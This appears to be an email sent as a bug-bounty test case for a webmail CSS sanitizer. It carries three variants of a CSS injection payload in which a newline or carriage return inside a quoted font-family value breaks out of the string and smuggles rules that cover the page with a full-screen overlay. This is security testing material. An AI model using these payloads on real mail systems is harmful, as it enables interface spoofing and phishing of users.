From: jouko <jouko@klikki.fi>
Subject: HackerOne test
To: vastaus@rocketmail.com
MIME-Version: 1.0
Content-type: text/html

Test case for https://jira.vzbuilders.com/browse/MAS-19596:
Newline in quoted property value
<style>
    div {
        font-family:"foo
        bar";background:url("cid://x;position:fixed;left:0px;top:0px;right:0px;bottom:0px;z-index:99999;background:blue;color:white;");
    }
</style>
Carriage Return in quoted property value
<style>
div {
bar";background:url("cid://x;position:fixed;left:0px;top:0px;right:0px;bottom:0px;z-index:99999;background:blue;color:white;");
}
</style>
Inline style attribute
<div style="font-family:'foo
bar';background:url('cid://x;position:fixed;left:0px;top:0px;right:0px;bottom:0px;z-index:99999;background:blue;color:white;');"></div>